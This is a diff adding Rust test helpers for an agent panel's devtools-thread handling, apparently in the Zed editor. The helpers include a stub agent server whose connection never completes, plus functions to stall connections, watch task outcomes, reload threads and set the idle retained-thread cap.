+// Story 055, task 10.2 (fix cycles 1 and 2) — the devtools-thread paths the pre-authored
+// `devtools_threads.rs` does not reach (design.md §B3, GOTCHA G7, Assumption A2; R5.1, R5.6):
+// a connection that never completes (the 30 s timeout), a view released before it connects, the
+// agent panel's idle cap while a devtools thread connects — created this run, or reloaded in a
+// run that never created one — and once that wait is over, a reload after that cap released a
+// connected one, an archived thread, and a devtools thread parked in the panel's draft slot.
+// Wired inside `src/browser_channel.rs` beside `devtools_threads`, so the Validation filter
+// `cargo test -p agent_ui devtools_threads` runs both files.
+
+use std::any::Any;
+use std::cell::RefCell;
+use std::path::{Path, PathBuf};
+use std::rc::Rc;
+use std::time::Duration;
+
+use acp_thread::{AgentConnection, StubAgentConnection};
+use agent_servers::{AgentServer, AgentServerDelegate};
+use anyhow::Result;
+use gpui::{App, Entity, EntityId, Task, TestAppContext, UpdateGlobal as _};
+use project::{AgentId, Project};
+use settings::SettingsStore;
+
+use super::test_support::*;
+use crate::Agent;
+use crate::browser_wire::ThreadInfo;
+use crate::devtools_threads::{CONNECT_TIMEOUT, DevtoolsThreadError, DevtoolsThreads};
+use crate::thread_metadata_store::{ThreadId, ThreadMetadataStore};
+use crate::thread_organization::ThreadOrganizationStore;
+
+/// An agent server whose connection never completes: a thread it serves stays connecting.
+struct PendingServer;
+
+impl AgentServer for PendingServer {
+    fn logo(&self) -> ui::IconName {
+        ui::IconName::ZedAgent
+    }
+
+    fn agent_id(&self) -> AgentId {
+        "Pending".into()
+    }
+
+    fn connect(
+        &self,
+        _delegate: AgentServerDelegate,
+        _project: Entity<Project>,
+        cx: &mut App,
+    ) -> Task<Result<Rc<dyn AgentConnection>>> {
+        cx.spawn(async |_| std::future::pending().await)
+    }
+
+    fn into_any(self: Rc<Self>) -> Rc<dyn Any> {
+        self
+    }
+}
+
+/// Every thread the window's panel creates from now on with its selected agent stays connecting.
+fn stall_connections(app: &Win, cx: &mut TestAppContext) {
+    let agent = app
+        .panel
+        .read_with(&app.cx, |panel, cx| panel.selected_agent(cx));
+    stall_connections_of(app, agent, cx);
+}
+
+/// Every thread the window's panel opens from now on with `agent` stays connecting.
+fn stall_connections_of(app: &Win, agent: Agent, cx: &mut TestAppContext) {
+    let store = app
+        .panel
+        .read_with(&app.cx, |panel, _| panel.connection_store().clone());
+    cx.update(|cx| {
+        store.update(cx, |store, cx| {
+            store.restart_connection(agent, Rc::new(PendingServer), cx);
+        });
+    });
+    cx.run_until_parked();
+}
+
+type Outcome<T> = Rc<RefCell<Option<Result<T>>>>;
+
+/// Records what `task` answers, so a test can tell "not answered yet" from an answer.
+fn watch<T: 'static>(task: Task<Result<T>>, cx: &mut TestAppContext) -> Outcome<T> {
+    let outcome: Outcome<T> = Rc::new(RefCell::new(None));
+    cx.update(|cx| {
+        cx.spawn({
+            let outcome = outcome.clone();
+            async move |_| {
+                let answer = task.await;
+                *outcome.borrow_mut() = Some(answer);
+            }
+        })
+        .detach();
+    });
+    outcome
+}
+
+fn start_create(root: &str, cx: &mut TestAppContext) -> Outcome<ThreadInfo> {
+    let task = cx.update(|cx| crate::devtools_threads::create(Path::new(root), cx));
+    let created = watch(task, cx);
+    cx.run_until_parked();
+    created
+}
+
+async fn create(root: &str, cx: &mut TestAppContext) -> Result<ThreadInfo> {
+    let task = cx.update(|cx| crate::devtools_threads::create(Path::new(root), cx));
+    cx.run_until_parked();
+    task.await
+}
+
+async fn ensure_loaded(thread_id: &str, cx: &mut TestAppContext) -> Result<()> {
+    let task = cx.update(|cx| crate::devtools_threads::ensure_loaded(thread_id, cx));
+    cx.run_until_parked();
+    task.await
+}
+
+/// The devtools threads the window's panel retains.
+fn retained_devtools_threads(app: &Win, cx: &mut TestAppContext) -> Vec<ThreadId> {
+    let panel = app.panel.clone();
+    cx.update(|cx| {
+        panel
+            .read(cx)
+            .retained_threads()
+            .keys()
+            .copied()
+            .filter(|id| {
+                DevtoolsThreads::try_global(cx)
+                    .is_some_and(|threads| threads.read(cx).is_devtools(*id).is_some())
+            })
+            .collect()
+    })
+}
+
+fn is_retained(app: &Win, thread_id: ThreadId) -> bool {
+    app.panel
+        .read_with(&app.cx, |panel, _| panel.is_retained_thread(&thread_id))
+}
+
+/// The view the window's panel holds for `thread_id` — active, retained or the parked draft.
+fn view_of(app: &Win, thread_id: ThreadId) -> Option<EntityId> {
+    app.panel.read_with(&app.cx, |panel, cx| {
+        panel
+            .conversation_view_for(thread_id, cx)
+            .map(|view| view.entity_id())
+    })
+}
+
+fn thread_id_of(key: &str, cx: &mut TestAppContext) -> ThreadId {
+    cx.update(|cx| {
+        ThreadMetadataStore::global(cx)
+            .read(cx)
+            .entry_ids()
+            .find(|id| id.to_key_string() == key)
+            .unwrap_or_else(|| panic!("{key} is a known thread"))
+    })
+}
+
+/// The save the conversation makes when the first message goes out: the draft gains a session.
+fn promote(key: &str, cx: &mut TestAppContext) {
+    let id = thread_id_of(key, cx);
+    cx.update(|cx| {
+        let store = ThreadMetadataStore::global(cx);
+        let mut metadata = store
+            .read(cx)
+            .entry(id)
+            .cloned()
+            .expect("metadata of a created thread");
+        metadata.session_id = Some(agent_client_protocol::v2::schema::SessionId::new(format!(
+            "session-{key}"
+        )));
+        store.update(cx, |store, cx| store.save(metadata, cx));
+    });
+    cx.run_until_parked();
+}
+
+fn set_max_idle_retained_threads(count: usize, cx: &mut TestAppContext) {
+    cx.update(|cx| {
+        SettingsStore::update_global(cx, |store, cx| {
+            store
+                .set_user_settings(
+                    &format!(r#"{{ "agent": {{ "max_idle_retained_threads": {count} }} }}"#),
+                    cx,
+                )
+                .expect("valid agent settings");
+        });
+    });
+    cx.run_until_parked();
+}
+
+/// The operator opens another thread in the panel: the one it showed becomes a retained thread,
+/// and the panel releases idle retained threads over its cap.
+fn open_another_editor_thread(app: &mut Win) {
+    crate::test_support::open_thread_with_custom_connection(
+        &app.panel,
+        StubAgentConnection::new()
+            .with_supports_load_session(true)
+            .with_agent_id("Other".into()),
+        &mut app.cx,
+    );
+}
+
+/// A connection whose sessions can be loaded again, under the agent id the window's panel keys
+/// it by (`StubAgentServer`'s "Test"): the id stored in a thread's metadata is the connection's,
+/// and a reload resolves its agent from it.
+fn loadable_connection() -> StubAgentConnection {
+    StubAgentConnection::new()
+        .with_supports_load_session(true)
+        .with_agent_id("Test".into())
+}
+
+fn start_failure_reason(error: &anyhow::Error) -> Option<&'static str> {
+    match error.downcast_ref::<DevtoolsThreadError>() {
+        Some(DevtoolsThreadError::AgentStartFailed { reason, .. }) => Some(reason),
+        _ => None,
+    }
+}
